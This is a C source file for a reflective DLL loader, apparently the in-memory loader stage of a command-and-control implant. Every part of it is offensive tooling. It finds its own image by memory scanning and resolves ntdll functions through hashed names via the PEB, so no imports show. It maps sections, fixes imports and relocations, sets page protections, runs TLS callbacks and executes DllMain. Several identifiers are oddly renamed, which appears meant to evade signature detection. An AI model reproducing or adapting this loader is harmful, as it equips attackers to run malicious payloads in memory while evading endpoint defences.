#include <Core.h>
#include <Native.h>
#include <ntdef.h>

DLLEXPORT VOID KaynLoader( LPVOID paraaaaa )
{
    INSTANCE                Inst        = { 0 };
    HMODULE                 KLibLd  = NULL;
    PIMAGE_NT_HEADERS       HeadNT       = NULL;
    PIMAGE_SECTION_HEADER   HeadSe       = NULL;
    LPVOID                  VirtKMeme  = NULL;
    SIZE_T                  SAZEEEE        = 0;
    PVOID                   MemSc       = NULL;
    SIZE_T                  MemScSize   = 0;
    ULONG                   proto      = 0;
    ULONG                   Oldproto   = 0;
    PIMAGE_DATA_DIRECTORY   ImgD        = NULL;
    PVOID                   StAdd    = NULL;
    DWORD                   rva             = 0;
    PIMAGE_TLS_DIRECTORY    tls             = 0;
    PIMAGE_TLS_CALLBACK     *cbs      = NULL;

    // 0. First we need to get the DLL base
    StAdd   = R2V2A( PVOID, CharStrToK, 0x70 );
    KLibLd = KaynCaller( StAdd );

    // ------------------------
    // 1. Load needed Functions
    // ------------------------
    Inst.Modules.Ntdll                 = GetModKHsh( NTDLL_HASH );

    Inst.Win32.LdrLoadDll              = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_LDRLOADDLL, 0  );
    Inst.Win32.NtAllocateVirtualMemory = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY, 0 );
    Inst.Win32.NtProtectVirtualMemory  = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY, 0 );
    Inst.Win32.NtFlushInstructionCache = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_NTFLUSHINSTRUCTIONCACHE, 0 );

    // ---------------------------------------------------------------------------
    // 2. Allocate virtual memory and copy headers and section into the new memory
    // ---------------------------------------------------------------------------
    HeadNT = R2V2A( PIMAGE_NT_HEADERS, KLibLd, ( ( PIMAGE_DOS_HEADER ) KLibLd )->e_lfanew );
    SAZEEEE  = HeadNT->OptionalHeader.SizeOfImage;

    if ( NT_SUCCESS( Inst.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &VirtKMeme, 0, &SAZEEEE, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        // ---- Copy Headers into new allocated memory ----
        Memcpy(VirtKMeme, KLibLd, HeadNT->OptionalHeader.SizeOfHeaders);
        ( ( PIMAGE_NT_HEADERS ) VirtKMeme )->OptionalHeader.ImageBase = VirtKMeme;

        // ---- Copy Sections into new allocated memory ----
        HeadSe = IMAGE_FIRST_SECTION( HeadNT );
        for ( DWORD i = 0; i < HeadNT->FileHeader.NumberOfSections; i++ )
        {
            Memcpy(
                R2V2A( PVOID, VirtKMeme, HeadSe[ i ].VirtualAddress ),      // Section New Memory
                R2V2A( PVOID, KLibLd, HeadSe[ i ].PointerToRawData ),    // Section Raw Data
                HeadSe[ i ].SizeOfRawData                                      // Section Size
            );
        }

        // ----------------------------------
        // 3. Process our images import table
        // ----------------------------------
        ImgD = & HeadNT->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
        if ( ImgD->VirtualAddress )
            KResolveIAT( &Inst, VirtKMeme, R2V2A( PVOID, VirtKMeme, ImgD->VirtualAddress ) );

        // ----------------------------
        // 4. Process image relocations
        // ----------------------------
        ImgD = & HeadNT->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImgD->VirtualAddress )
            KReAllocSections( VirtKMeme, HeadNT->OptionalHeader.ImageBase, R2V2A( PVOID, VirtKMeme, ImgD->VirtualAddress ) );

        // ----------------------------------
        // 5. Set protection for each section
        // ----------------------------------
        MemSc     = VirtKMeme;
        MemScSize = HeadNT->OptionalHeader.SizeOfHeaders;
        proto    = PAGE_READONLY;
        Oldproto = 0;
        Inst.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &MemSc, &MemScSize, proto, &Oldproto );

        for ( DWORD i = 0; i < HeadNT->FileHeader.NumberOfSections; i++ )
        {
            MemSc       = R2V2A( PVOID, VirtKMeme, HeadSe[ i ].VirtualAddress );
            MemScSize   = HeadSe[ i ].SizeOfRawData;
            proto      = 0;
            Oldproto   = 0;

            if ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                proto = PAGE_WRITECOPY;

            if ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                proto = PAGE_READONLY;

            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                proto = PAGE_READWRITE;

            if ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                proto = PAGE_EXECUTE;

            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                proto = PAGE_EXECUTE_WRITECOPY;

            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                proto = PAGE_EXECUTE_READ;

            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                proto = PAGE_EXECUTE_READWRITE;

            Inst.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &MemSc, &MemScSize, proto, &Oldproto );
        }

        Inst.Win32.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );

        // ----------------------------------
        // 6. Execute TLS cbs
        // ----------------------------------
        rva = HeadNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
        if ( rva != 0 )
        {
            tls = R2V2A(PIMAGE_TLS_DIRECTORY, VirtKMeme, rva);
            cbs = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;

            if ( cbs )
            {
                while( *cbs != NULL )
                {
                    // call function
                    (*cbs)((LPVOID)VirtKMeme, DLL_PROCESS_ATTACH, NULL);
                    cbs++;
                }
            }
        }

        // --------------------------------
        // 7. Finally executing our DllMain
        // --------------------------------
        BOOL ( WINAPI *LLDKman ) ( PVOID, DWORD, PVOID ) = R2V2A( PVOID, VirtKMeme, HeadNT->OptionalHeader.AddressOfEntryPoint );
        LLDKman( VirtKMeme, DLL_PROCESS_ATTACH, paraaaaa );
    }
}

NAKED LPVOID KaynCaller( PVOID StAdd )
{
    asm(
        "start: \n"
        "xor rbx, rbx \n"
        "mov ebx, 0x5A4D \n"
        "loop: \n"
        "inc rcx \n"
        "cmp bx,  [ rcx ] \n"
        "jne loop \n"
        "xor rax, rax \n"
        "mov ax,  [ rcx + 0x3C ] \n"
        "add rax, rcx \n"
        "xor rbx, rbx \n"
        "add bx,  0x4550 \n"
        "cmp bx,  [ rax ] \n"
        "jne start \n"
        "mov rax, rcx \n"
        "ret \n"
    );
}

NAKED VOID Memcpy( PVOID Destination, PVOID source, SIZE_T Size )
{
    asm(
        "xor r10, r10 \n"
        "test r8, r8 \n"
        "jne copy1 \n"
        "ret \n"
        "copy1: \n"
        "dec r8 \n"
        "mov r10b, [rdx] \n"
        "mov [rcx], r10b \n"
        "inc rdx \n"
        "inc rcx \n"
        "test r8, r8 \n"
        "jne copy1 \n"
        "ret \n"
    );
}

PVOID GetModKHsh( DWORD ModuleHash )
{
    PLDR_DATA_TABLE_ENTRY   LoaderEntry = NULL;
    PLIST_ENTRY             ModuleList  = NULL;
    PLIST_ENTRY             NextList    = NULL;

    /* Get pointer to list */
    ModuleList = & ( ( PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList;
    NextList   = ModuleList->Flink;

    for ( ; ModuleList != NextList ; NextList = NextList->Flink )
    {
        LoaderEntry = NextList;

        if ( KHashString( LoaderEntry->BaseDllName.Buffer, LoaderEntry->BaseDllName.Length ) == ModuleHash )
            return LoaderEntry->DllBase;
    }

    return NULL;
}

FORCE_INLINE UINT32 CopyDotStr( PCHAR String )
{
    for ( UINT32 i = 0; i < KStringLengthA( String ); i++ )
    {
        if ( String[ i ] == '.' )
            return i;
    }
}

PVOID GetPrAddHs( PINSTANCE Inst, PVOID DllModuleBase, DWORD FunctionHash, DWORD Ordinal )
{
    PIMAGE_NT_HEADERS       ModuleNtHeader          = NULL;
    PIMAGE_EXPORT_DIRECTORY ModuleExportedDirectory = NULL;
    SIZE_T                  ExportedDirectorySize   = 0;
    PDWORD                  AddressOfFunctions      = NULL;
    PDWORD                  AddressOfNames          = NULL;
    PWORD                   AddressOfNameOrdinals   = NULL;
    PVOID                   FunctionAddr            = NULL;
    UINT32                  Index                   = 0;

    ModuleNtHeader          = R2V2A( PIMAGE_NT_HEADERS,       DllModuleBase, ( ( PIMAGE_DOS_HEADER ) DllModuleBase )->e_lfanew );
    ModuleExportedDirectory = R2V2A( PIMAGE_EXPORT_DIRECTORY, DllModuleBase, ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExportedDirectorySize   = ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;

    AddressOfNames          = R2V2A( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfNames );
    AddressOfFunctions      = R2V2A( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfFunctions );
    AddressOfNameOrdinals   = R2V2A( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ModuleExportedDirectory->NumberOfNames; i++ )
    {
        if ( KHashString( R2V2A( PCHAR, DllModuleBase, AddressOfNames[ i ] ), 0 ) == FunctionHash )
        {
            FunctionAddr = R2V2A( PVOID, DllModuleBase, AddressOfFunctions[ AddressOfNameOrdinals[ i ] ] );
            if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ModuleExportedDirectory &&
                 ( ULONG_PTR ) FunctionAddr <  R2V2A( ULONG_PTR, ModuleExportedDirectory, ExportedDirectorySize ) )
            {
                CHAR    Library [ MAX_PATH ] = { 0 };
                CHAR    Function[ MAX_PATH ] = { 0 };

                // where is the dot
                Index = CopyDotStr( FunctionAddr );

                // Copy the library from our string
                Memcpy( Library,  FunctionAddr, Index );

                // Copy the function from our string
                Memcpy( Function, R2V2A( PVOID, FunctionAddr, Index + 1 ), KStringLengthA( R2V2A( PCHAR, FunctionAddr, Index + 1 ) ) );

                DllModuleBase = KLoadLibrary( Inst, Library );
                FunctionAddr  = GetPrAddHs( Inst, DllModuleBase, KHashString( Function, 0 ), 0 );
            }

            return FunctionAddr;
        }
    }

    return NULL;
}

VOID KResolveIAT( PINSTANCE Inst, LPVOID KaynImage, LPVOID IatDir )
{
    PIMAGE_THUNK_DATA        OriginalTD        = NULL;
    PIMAGE_THUNK_DATA        FirstTD           = NULL;

    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = NULL;
    PIMAGE_IMPORT_BY_NAME    pImportByName     = NULL;

    PCHAR                    ImportModuleName  = NULL;
    HMODULE                  ImportModule      = NULL;

    for ( pImportDescriptor = IatDir; pImportDescriptor->Name != 0; ++pImportDescriptor )
    {
        ImportModuleName = R2V2A( PCHAR, KaynImage, pImportDescriptor->Name );
        ImportModule     = KLoadLibrary( Inst, ImportModuleName );

        OriginalTD       = R2V2A( PIMAGE_THUNK_DATA, KaynImage, pImportDescriptor->OriginalFirstThunk );
        FirstTD          = R2V2A( PIMAGE_THUNK_DATA, KaynImage, pImportDescriptor->FirstThunk );

        for ( ; OriginalTD->u1.AddressOfData != 0 ; ++OriginalTD, ++FirstTD )
        {
            if ( IMAGE_SNAP_BY_ORDINAL( OriginalTD->u1.Ordinal ) )
            {
                // TODO: get function by ordinal
                PVOID Function = GetPrAddHs( Inst, ImportModule, NULL, IMAGE_ORDINAL( OriginalTD->u1.Ordinal ) );
                if ( Function != NULL )
                    FirstTD->u1.Function = Function;
            }
            else
            {
                pImportByName       = R2V2A( PIMAGE_IMPORT_BY_NAME, KaynImage, OriginalTD->u1.AddressOfData );
                DWORD  FunctionHash = KHashString( pImportByName->Name, KStringLengthA( pImportByName->Name ) );
                LPVOID Function     = GetPrAddHs( Inst, ImportModule, FunctionHash, 0 );

                if ( Function != NULL )
                    FirstTD->u1.Function = Function;
            }
        }
    }
}

VOID KReAllocSections( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir )
{
    PIMAGE_BASE_RELOCATION  pImageBR = (PIMAGE_BASE_RELOCATION)BaseRelocDir;
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}

PVOID KLoadLibrary( PINSTANCE Inst, LPSTR ModuleName )
{
    if ( ! ModuleName )
        return NULL;

    UNICODE_STRING  UnicodeString           = { 0 };
    WCHAR           ModuleNameW[ MAX_PATH ] = { 0 };
    DWORD           dwModuleNameSize        = KStringLengthA( ModuleName );
    HMODULE         Module                  = NULL;

    CharStrToK( ModuleNameW, ModuleName, dwModuleNameSize );

    if ( ModuleNameW )
    {
        USHORT DestSize             = KStringLengthW( ModuleNameW ) * sizeof( WCHAR );
        UnicodeString.Length        = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
    }

    UnicodeString.Buffer = ModuleNameW;

    if ( NT_SUCCESS( Inst->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
        return Module;
    else
        return NULL;
}

/*
 ---------------------------------
 ---- String & Data functions ----
 ---------------------------------
*/

DWORD KHashString( PVOID String, SIZE_T Length )
{
    ULONG   Hash = HASH_KEY;
    PUCHAR  Ptr  = String;

    do
    {
        UCHAR character = *Ptr;

        if ( ! Length )
        {
            if ( !*Ptr ) break;
        }
        else
        {
            if ( (ULONG) ( Ptr - (PUCHAR)String ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        if ( character >= 'a' )
            character -= 0x20;

        Hash = ( ( Hash << 5 ) + Hash ) + character;
        ++Ptr;
    } while ( TRUE );

    return Hash;
}

SIZE_T KStringLengthA( LPCSTR String )
{
    LPCSTR String2 = String;
    for (String2 = String; *String2; ++String2);
    return (String2 - String);
}

SIZE_T KStringLengthW(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

SIZE_T CharStrToK( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
{
    INT Length = MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}
